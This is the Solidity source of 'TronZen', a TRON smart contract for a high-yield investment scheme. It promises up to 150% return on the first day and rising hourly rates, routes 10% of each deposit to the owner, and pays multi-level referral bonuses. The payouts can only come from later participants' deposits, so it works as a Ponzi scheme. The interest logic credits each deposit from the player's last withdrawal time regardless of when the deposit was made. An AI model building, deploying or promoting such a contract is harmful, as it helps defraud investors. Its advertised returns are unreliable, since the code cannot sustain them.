//SourceUnit: tronzen.sol

pragma solidity 0.5.9;

/******
 *
 *   Project TronZen Smart Contract by A.C. IT Group
 *
 *   Website:
 *   https://tronzen.site/
 *
 *   Up to 150% ROI on Day 1
 *
 *   +0.5% Hourly Rate for not Withdrawing
 *
 *   Withdrawals will reset hourly rate back to 0.5%
 *
 *   Referrals:
 *      Level 1 - 8%
 *      Level 2 - 5%
 *      Level 3 - 2%
 *
 *   Referral Bonus is sent DIRECTLY TO WALLET
 *
 *   Launch Date: 23 DECEMBER 2020, 8AM GMT
 **/


/******
 *
 *  Hold Rate Table for 12 Hours no Withdrawal
 *
 *  HOURS   RATE   TOTAL ROI
 *  1       0.5%   0.5%
 *  2       1.0%   1.5%
 *  3       1.5%   3.0%
 *  4       2.0%   5.0%
 *  5       2.5%   7.5%
 *  6       3.0%   10.5%
 *  7       3.5%   14.0%
 *  8       4.0%   18.0%
 *  9       4.5%   22.5%
 *  10      5.0%   27.5%
 *  11      5.5%   33.0%
 *  12      6.0%   39.0%
 *  ...
 *  18      9.0%   85.5%
 *  19      9.5%   95.0%
 *  20      10.0%  105.0%
 *  ...
 *  24      12.0%  150.0%
 *  ...
 *  48      24.0%  588.0%
 *
 *  and so on...
 *
 *
 **/


contract TRONZEN {

    using SafeMath for uint256;
	
    address payable public owner;

    uint256 public total_investors;
    uint256 public total_invested;
    uint256 public total_withdrawn;
    uint256 public total_referral_bonus;

    uint256 public soft_release;
    uint256 public full_release;

    uint8[] public referral_bonuses;

    struct Player {
        address payable referral;
        uint256 last_withdraw;
        uint256 dividends;
        uint256 referral_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_referral_bonus;
        PlayerDeposit[] deposits;
        mapping(uint8 => uint256) referrals_per_level;
    }

    struct PlayerDeposit {
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
    }

    mapping(address => Player) public players;

    event Deposit(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event Reinvest(address indexed addr, uint256 amount);
    event ReferralPayout(address indexed addr, uint256 amount, uint8 level);

    constructor() public {
        owner = msg.sender;
		
        referral_bonuses.push(8);
        referral_bonuses.push(5);
        referral_bonuses.push(2);

        soft_release = 1608710400;
        full_release = 1608710400;
    }

    function deposit(address payable _referral) external payable {
        require(uint256(block.timestamp) > soft_release, "Not launched");
        require(msg.value >= 1e8, "Minimal deposit: 100 TRX");
        Player storage player = players[msg.sender];
        require(player.deposits.length < 2000, "Max 2000 deposits per address");

        _setReferral(msg.sender, _referral);

        player.deposits.push(PlayerDeposit({
            amount: msg.value,
            totalWithdraw: 0,
            time: uint256(block.timestamp)
        }));

        if(player.total_invested == 0x0){
			player.last_withdraw = now;
            total_investors += 1;
        }

        player.total_invested += msg.value;
        total_invested += msg.value;

        _referralPayout(msg.sender, msg.value);

        owner.transfer(msg.value.div(10));

        emit Deposit(msg.sender, msg.value);
    }

    function _setReferral(address _addr, address payable _referral) private {
        if(players[_addr].referral == address(0)) {
            players[_addr].referral = _referral;
            for(uint8 i = 0; i < referral_bonuses.length; i++) {
                players[_referral].referrals_per_level[i]++;
                _referral = players[_referral].referral;
                if(_referral == address(0)) break;
            }
        }
    }

    function _referralPayout(address payable _addr, uint256 _amount) private {
        address payable ref = players[_addr].referral;

        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            if(ref == address(0)) ref = owner;
            uint256 bonus = _amount * referral_bonuses[i] / 100;

			ref.transfer(bonus);
            players[ref].total_referral_bonus += bonus;
            total_referral_bonus += bonus;

            emit ReferralPayout(ref, bonus, (i+1));
            ref = players[ref].referral;
        }
    }

    function withdraw() payable external {
        require(uint256(block.timestamp) > full_release, "Not launched");
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.referral_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.referral_bonus;

        player.dividends = 0;
        player.referral_bonus = 0;
        player.total_withdrawn += amount;
        total_withdrawn += amount;

		player.last_withdraw = now;
        msg.sender.transfer(amount);

        emit Withdraw(msg.sender, amount);
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            _updateTotalPayout(_addr);
            players[_addr].last_payout = uint256(block.timestamp);
            players[_addr].dividends += payout;
        }
    }


    function _updateTotalPayout(address _addr) private{
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
		
            PlayerDeposit storage dep = player.deposits[i];
			uint256 time_passed = now - player.last_withdraw;
			uint256 rate = 50;
			uint256 total = 0;
			for(uint256 a = 0; a < time_passed / 3600; a++) {
				rate += 50;
				total += dep.amount * rate / 1000;
			}
			
			total += dep.amount * (time_passed % 3600) * rate / 1000 / 3600;
			
			player.deposits[i].totalWithdraw += total;
			
        }
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
		
            PlayerDeposit storage dep = player.deposits[i];
			uint256 time_passed = now - player.last_withdraw;
			uint256 rate = 50;
			for(uint256 a = 0; a < time_passed / 3600; a++) {
				rate += 50;
				value += dep.amount * rate / 1000;
			}
			
			value += dep.amount * (time_passed % 3600) * rate / 1000 / 3600;
			
        }

        return value;
    }

    function contractInfo() view external returns(uint256 _total_invested, uint256 _total_investors, uint256 _total_withdrawn, uint256 _total_referral_bonus) {
        return (total_invested, total_investors, total_withdrawn, total_referral_bonus);
    }

    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 withdrawable_referral_bonus, uint256 invested, uint256 withdrawn, uint256 referral_bonus, uint256[8] memory referrals, uint256 last_withdraw) {
        Player storage player = players[_addr];
        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            referrals[i] = player.referrals_per_level[i];
        }
        return (
            payout + player.dividends + player.referral_bonus,
            player.referral_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_referral_bonus,
            referrals,
			player.last_withdraw
        );
    }

    function investmentsInfo(address _addr) view external returns(uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory totalWithdraws) {
        Player storage player = players[_addr];
        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _totalWithdraws = new uint256[](player.deposits.length);

        for(uint256 i = 0; i < player.deposits.length; i++) {
          PlayerDeposit storage dep = player.deposits[i];

          _amounts[i] = dep.amount;
          _totalWithdraws[i] = dep.totalWithdraw;
          _endTimes[i] = 0;
        }
        return (
          _endTimes,
          _amounts,
          _totalWithdraws
        );
    }
}




library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}